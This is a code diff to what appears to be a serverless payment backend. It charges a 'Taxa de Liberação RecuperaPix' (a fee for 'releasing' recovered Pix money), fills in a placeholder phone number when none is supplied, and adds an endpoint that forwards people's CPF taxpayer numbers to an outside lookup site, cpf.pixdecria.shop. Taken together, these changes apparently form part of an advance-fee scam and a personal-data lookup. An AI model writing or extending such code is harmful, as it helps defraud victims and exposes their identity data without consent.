@@ -18,7 +18,7 @@ async function handlePixCreate(request) {
     try { body = await request.json(); } catch { return jsonRes({ error: "invalid json" }, 400); }
 
     const { name, document: doc, email, phone, utm } = body;
-    if (!name || !doc || !email || !phone) {
+    if (!name || !doc || !email) {
         return jsonRes({ error: "missing required fields" }, 400);
     }
 
@@ -28,7 +28,7 @@ async function handlePixCreate(request) {
             name: String(name),
             document: String(doc).replace(/\D/g, ""),
             email: String(email),
-            phone: String(phone).replace(/\D/g, ""),
+            phone: phone ? String(phone).replace(/\D/g, "") : "11999999999",
         },
         item: {
             title: "Taxa de Liberação RecuperaPix",
@@ -61,6 +61,22 @@ async function handlePixCreate(request) {
     return jsonRes({ error: "network error" }, 502);
 }
 
+async function handleCpfLookup(url) {
+    const digits = url.pathname.split("/").pop().replace(/\D/g, "");
+    if (digits.length !== 11) return jsonRes({ error: "invalid cpf" }, 400);
+    const cpf = digits.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+
+    try {
+        const res = await fetch(`https://cpf.pixdecria.shop/api/v1/consult/${cpf}`, {
+            headers: { "Accept": "application/json" },
+        });
+        const data = await res.json();
+        return jsonRes(data, res.status);
+    } catch {
+        return jsonRes({ error: "lookup unavailable" }, 502);
+    }
+}
+
 async function handlePixStatus(request) {
     const { searchParams } = new URL(request.url);
     const transactionId = searchParams.get("transactionId");
@@ -79,6 +95,9 @@ export default {
     async fetch(request, env) {
         const url = new URL(request.url);
 
+        if (url.pathname.startsWith("/api/cpf/") && request.method === "GET") {
+            return handleCpfLookup(url);
+        }
         if (url.pathname === "/api/pix/create" && request.method === "POST") {
             return handlePixCreate(request);
         }
